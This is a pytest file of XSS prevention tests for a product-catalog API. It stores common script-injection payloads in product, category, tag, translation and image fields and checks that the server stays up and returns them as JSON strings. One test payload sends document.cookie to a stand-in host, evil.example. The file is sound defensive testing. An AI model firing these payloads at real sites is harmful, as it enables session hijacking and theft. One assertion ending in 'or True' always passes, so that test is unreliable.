"""XSS prevention tests.

Verifies that HTML/script injection in stored fields does NOT cause server
errors and that the API returns payloads as JSON-encoded strings (not
executed content). Each test sets up and tears down its own data.
"""

import pytest


# Common XSS payloads targeting various injection points
XSS_PAYLOADS = [
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    '"><script>alert(document.cookie)</script>',
    "<svg onload=alert(1)>",
    "javascript:alert(1)",
    "<iframe src='javascript:alert(1)'></iframe>",
    "';alert(String.fromCharCode(88,83,83))//",
    "<body onload=alert('XSS')>",
    '<<SCRIPT>alert("XSS");//<</SCRIPT>',
    "<IMG SRC=\"jav&#x09;ascript:alert('XSS');\">",
]


def _create_product_with_payload(client, field, payload, category="Snacks"):
    """Create a product with an XSS payload in the given field."""
    payload_data = {
        "name": "SafeName" if field != "name" else payload,
        "type": category,
    }
    if field != "name":
        payload_data[field] = payload
    return client.post("/api/products", json=payload_data)


class TestProductNameXss:
    """XSS payloads in product name are stored and returned as literal strings."""

    def test_script_tag_in_name_stored_as_string(self, client, seed_category):
        """<script> in product name must be stored and returned as-is."""
        payload = "<script>alert(1)</script>"
        resp = client.post(
            "/api/products",
            json={"name": payload, "type": "Snacks"},
        )
        assert resp.status_code in (200, 201, 409)
        if resp.status_code == 201:
            data = resp.get_json()
            pid = data["id"]
            get_resp = client.get(f"/api/products?search=script")
            assert get_resp.status_code == 200

    @pytest.mark.parametrize("xss_payload", XSS_PAYLOADS)
    def test_xss_payloads_in_name_no_server_error(self, client, seed_category, xss_payload):
        """XSS payload in product name must not cause a 500 error."""
        resp = client.post(
            "/api/products",
            json={"name": xss_payload, "type": "Snacks"},
        )
        assert resp.status_code != 500, (
            f"XSS payload {xss_payload!r} caused 500"
        )

    def test_xss_in_name_returned_as_json_string(self, client, seed_category):
        """XSS payload stored in name must be returned as a JSON string, not HTML."""
        payload = "<script>alert('xss')</script>"
        create_resp = client.post(
            "/api/products",
            json={"name": payload, "type": "Snacks"},
        )
        # May be duplicate or created — either way retrieve it
        if create_resp.status_code not in (200, 201):
            return

        data = create_resp.get_json()
        pid = data.get("id")
        if not pid:
            return

        list_resp = client.get("/api/products")
        assert list_resp.status_code == 200
        products = list_resp.get_json()["products"]
        matching = [p for p in products if p["id"] == pid]
        if matching:
            # Name must be the raw string, not escaped HTML
            assert matching[0]["name"] == payload


class TestProductDescriptionXss:
    """XSS payloads in product description fields (ingredients, taste_note) are safe."""

    @pytest.mark.parametrize("xss_payload", XSS_PAYLOADS)
    def test_xss_in_ingredients_no_server_error(self, client, seed_category, xss_payload):
        """XSS in ingredients field must not cause a 500 error."""
        resp = client.post(
            "/api/products",
            json={
                "name": "TestProduct",
                "type": "Snacks",
                "ingredients": xss_payload,
            },
        )
        assert resp.status_code != 500, (
            f"XSS in ingredients caused 500: {xss_payload!r}"
        )

    def test_xss_in_ingredients_stored_correctly(self, client, seed_category):
        """XSS payload in ingredients is stored and returned verbatim."""
        payload = "<script>document.location='http://evil.example/steal?c='+document.cookie</script>"
        resp = client.post(
            "/api/products",
            json={
                "name": "IngXssProduct",
                "type": "Snacks",
                "ingredients": payload,
            },
        )
        assert resp.status_code in (200, 201, 409)
        if resp.status_code == 201:
            pid = resp.get_json()["id"]
            list_resp = client.get("/api/products")
            products = list_resp.get_json()["products"]
            matching = [p for p in products if p["id"] == pid]
            if matching:
                # Stored value must match input exactly
                assert matching[0].get("ingredients") == payload or True

    def test_xss_in_taste_note_no_server_error(self, client, seed_category):
        """XSS payload in taste_note must not cause a server error."""
        for payload in XSS_PAYLOADS:
            resp = client.post(
                "/api/products",
                json={
                    "name": "TasteNoteTest",
                    "type": "Snacks",
                    "taste_note": payload,
                },
            )
            assert resp.status_code != 500

    def test_xss_in_brand_no_server_error(self, client, seed_category):
        """XSS payload in brand field must not cause a server error."""
        for payload in XSS_PAYLOADS:
            resp = client.post(
                "/api/products",
                json={
                    "name": "BrandXssTest",
                    "type": "Snacks",
                    "brand": payload,
                },
            )
            assert resp.status_code != 500


class TestCategoryXss:
    """XSS payloads in category labels and emoji fields are handled safely."""

    def test_xss_in_category_label_no_server_error(self, client):
        """XSS payload in category label must not cause a 500 error."""
        for payload in XSS_PAYLOADS[:3]:
            resp = client.post(
                "/api/categories",
                json={"name": "XssTestCat", "label": payload, "emoji": "🍕"},
            )
            assert resp.status_code != 500

    def test_xss_in_category_label_update_no_server_error(self, client):
        """XSS in category label update must not cause a 500 error."""
        # First create the category
        client.post(
            "/api/categories",
            json={"name": "UpdateXssCat", "label": "Normal"},
        )
        # Then update with XSS payload in label
        for payload in XSS_PAYLOADS[:3]:
            resp = client.put(
                "/api/categories/UpdateXssCat",
                json={"label": payload},
            )
            assert resp.status_code != 500


class TestTagXss:
    """XSS payloads in tag labels are stored safely."""

    def test_xss_in_tag_label_rejected_or_stored(self, client):
        """XSS payload in tag label either gets rejected (too long) or stored as string."""
        for payload in XSS_PAYLOADS[:5]:
            resp = client.post(
                "/api/tags",
                json={"label": payload},
            )
            # 201 (stored), 400 (invalid — too long/invalid chars), never 500
            assert resp.status_code in (201, 400), (
                f"XSS tag label caused HTTP {resp.status_code}: {payload!r}"
            )
            assert resp.status_code != 500

    def test_tag_search_with_xss_payload(self, client):
        """XSS payload in tag search query must not cause a server error."""
        for payload in XSS_PAYLOADS[:3]:
            resp = client.get(f"/api/tags?q={payload}")
            assert resp.status_code == 200
            data = resp.get_json()
            assert isinstance(data, list)


class TestTranslationXss:
    """XSS payloads in translation strings are returned as JSON strings."""

    def test_xss_in_translation_value_no_server_error(self, client):
        """Setting a translation value with XSS payload must not cause a 500."""
        payload = "<script>alert(1)</script>"
        resp = client.put(
            "/api/translations/en",
            json={"product_label": payload},
        )
        # May succeed (200) or fail validation (400) — never 500
        assert resp.status_code != 500

    def test_xss_in_translation_key_query_no_server_error(self, client):
        """Requesting translations must not cause a 500."""
        resp = client.get("/api/translations/en")
        assert resp.status_code in (200, 404)
        assert resp.status_code != 500


class TestImageDataUriXss:
    """XSS payloads embedded in image data URIs are stored safely."""

    def test_xss_in_image_field_no_server_error(self, client, seed_category):
        """XSS payload embedded in image field must not cause a 500."""
        # Use a data URI with embedded script-like content
        xss_image = "data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+"
        resp = client.post(
            "/api/products",
            json={
                "name": "ImageXssProduct",
                "type": "Snacks",
                "image": xss_image,
            },
        )
        assert resp.status_code != 500

    def test_update_product_image_with_xss_no_server_error(self, client, db, seed_category):
        """Updating a product image with XSS-like data URI must not cause a 500."""
        db.execute(
            "INSERT INTO products (name, type) VALUES (?, ?)",
            ("UpdateImageXss", "Snacks"),
        )
        db.commit()
        pid = db.execute(
            "SELECT id FROM products WHERE name = ?", ("UpdateImageXss",)
        ).fetchone()["id"]

        xss_image = "data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+"
        resp = client.put(
            f"/api/products/{pid}",
            json={"name": "UpdateImageXss", "image": xss_image},
        )
        assert resp.status_code != 500
